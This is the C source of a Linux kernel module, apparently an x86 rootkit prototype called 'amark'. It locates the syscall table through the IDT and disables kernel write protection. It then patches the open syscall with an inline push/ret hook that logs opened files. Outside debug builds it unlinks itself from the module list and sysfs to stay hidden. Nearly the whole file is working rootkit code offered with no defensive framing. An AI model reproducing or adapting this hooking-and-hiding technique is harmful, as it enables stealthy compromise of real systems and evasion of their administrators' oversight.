/* ts=4 sw=4 */

#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");

#define __DEBUG__    (1)
#define HIJACK_SIZE  (20) // This can be random number 6 <= S < 242

struct sym_hook {
  void *addr;
  unsigned char o_code[HIJACK_SIZE];
  unsigned char n_code[HIJACK_SIZE];
  struct list_head list;
};

LIST_HEAD(hooked_syms);

typedef void (*sys_call_ptr_t)(void);
typedef asmlinkage long (*orig_open_t)(const char __user *filename, int flags, int mode);

pte_t *pte;
unsigned int level;
orig_open_t orig_open = NULL;
static struct timer_list my_timer;
sys_call_ptr_t *_sys_call_table = NULL;

inline unsigned long disable_wp(void)
{
  unsigned long cr0;

  preempt_disable();
  barrier();

  cr0 = read_cr0();
  write_cr0(cr0 & ~X86_CR0_WP);
  return cr0;
}

inline void restore_wp(unsigned long cr0)
{
  write_cr0(cr0);

  barrier();
  preempt_enable_no_resched();
}

void hijack_stop(void *target)
{
  struct sym_hook *sa;

  list_for_each_entry (sa, &hooked_syms, list)
    if (target == sa->addr)
    {
      unsigned long o_cr0 = disable_wp();
      memcpy(target, sa->o_code, HIJACK_SIZE);
      restore_wp(o_cr0);

      list_del(&sa->list);
      kfree(sa);
      break;
    }
}

void hijack_pause(void *target)
{
  struct sym_hook *sa;

  list_for_each_entry (sa, &hooked_syms, list)
    if (target == sa->addr)
    {
      unsigned long o_cr0 = disable_wp();
      memcpy(target, sa->o_code, HIJACK_SIZE);
      restore_wp(o_cr0);
    }
}

void hijack_resume(void *target)
{
  struct sym_hook *sa;

  list_for_each_entry (sa, &hooked_syms, list)
    if (target == sa->addr)
    {
      unsigned long o_cr0 = disable_wp();
      memcpy(target, sa->n_code, HIJACK_SIZE);
      restore_wp(o_cr0);
    }
}

asmlinkage long hooked_open(const char __user *filename, int flags, int mode) {
  long ret;

  hijack_pause(orig_open);
  ret = orig_open(filename, flags, mode);
  hijack_resume(orig_open);

  printk(KERN_DEBUG "file %s has been opened with mode %d {ret=%lu]\n", filename, mode, ret);

  return ret;
}

#if __DEBUG__
static void timer_callback(unsigned long data)
{
  printk("+ hijacking stoped\n");
  hijack_stop(orig_open);
}
#endif /* !__DEBUG__ */

static void get_sys_call_table(void) {
  gate_desc *idt_table;
  gate_desc *system_call_gate;
  struct desc_ptr idtr;
  unsigned char *_system_call_ptr;
  unsigned char *off;
  unsigned int _system_call_off;
  unsigned int i;

  asm ("sidt %0" : "=m" (idtr));
  printk("+ IDT is at %08lx\n", idtr.address);

  idt_table = (gate_desc *) idtr.address;
  system_call_gate = &idt_table[0x80];

  _system_call_off = (system_call_gate->a & 0xffff) | (system_call_gate->b & 0xffff0000);
  _system_call_ptr = (unsigned char *) _system_call_off;

  printk("+ system_call is at %08x\n", _system_call_off);

  // scan for known pattern in system_call (int 0x80) handler
  // pattern is just before sys_call_table address
  for (i = 0; i < 128; i++) {
    off = _system_call_ptr + i;
    if (*(off) == 0xff && *(off+1) == 0x14 && *(off+2) == 0x85) {
      _sys_call_table = *(sys_call_ptr_t **)(off+3);
      printk("+ found sys_call_table at %08lx!\n",(unsigned long) _sys_call_table);
      return ;
    }
  }
}

static void hide_amark(void) {
  /* struct kernfs_node *sd; TODO: see what we can do */

  list_del_init(&__this_module.list);
  kobject_del(&THIS_MODULE->mkobj.kobj);
}

void insert_push_ret_instr_syscall(void *target, void *new)
{
  struct sym_hook *sa;
  unsigned char o_code[HIJACK_SIZE], n_code[HIJACK_SIZE];
  unsigned long o_cr0;
  char op_inject[HIJACK_SIZE];
  unsigned int i;

  op_inject[0] = '\x68'; // push addr
  for (i = 1; i < HIJACK_SIZE - 1; i++)
  {
    if ((HIJACK_SIZE - (i + 1)) > 1)
    {
      // {add,sub} al 0
      op_inject[i] = (jiffies % 2 ? '\x04' : '\x2c');
      op_inject[++i] = '\x00';
    }
    else
      op_inject[i] = '\x90'; // xchg eax, eax
  }
  op_inject[HIJACK_SIZE - 1] = '\xc3'; // ret

  memcpy(n_code, op_inject, HIJACK_SIZE);
  *(unsigned long *)&n_code[1] = (unsigned long)new;

  memcpy(o_code, target, HIJACK_SIZE);

  o_cr0 = disable_wp();
  memcpy(target, n_code, HIJACK_SIZE);
  restore_wp(o_cr0);

  sa = kmalloc(sizeof(*sa), GFP_KERNEL);
  if (!sa)
    return;

  sa->addr = target;
  memcpy(sa->o_code, o_code, HIJACK_SIZE);
  memcpy(sa->n_code, n_code, HIJACK_SIZE);

  list_add(&sa->list, &hooked_syms);
}

static int __init amark_init(void) {
#if __DEBUG__
  int timeout_ms = 10000;
#endif

  printk("+ amark loaded\n");

  get_sys_call_table();

  if (_sys_call_table == NULL) {
    printk("+ unable to locate sys_call_table\n");
    return 0;
  }

#if !__DEBUG__
  hide_amark();
#endif

  orig_open = (void *) _sys_call_table[__NR_open];

  // unprotect sys_call_table memory page
  pte = lookup_address((unsigned long) _sys_call_table, &level);

  // change PTE to allow writing
  set_pte_atomic(pte, pte_mkwrite(*pte));

  printk("+ unprotected kernel memory page containing sys_call_table\n");

  insert_push_ret_instr_syscall(orig_open, &hooked_open);

  printk("+ open hooked!\n");

#if __DEBUG__
  setup_timer(&my_timer, timer_callback, 0);
  printk("+ starting timer the hijacked syscall by the real one in %dms (%ld)\n", timeout_ms, jiffies);
  mod_timer(&my_timer, jiffies + msecs_to_jiffies(timeout_ms));
#endif /* !__DEBUG__ */

  return 0;
}

static void __exit amark_cleanup(void) {

  printk("+ Unloading module\n");
  hijack_stop(orig_open);
}

module_init(amark_init);
module_exit(amark_cleanup);
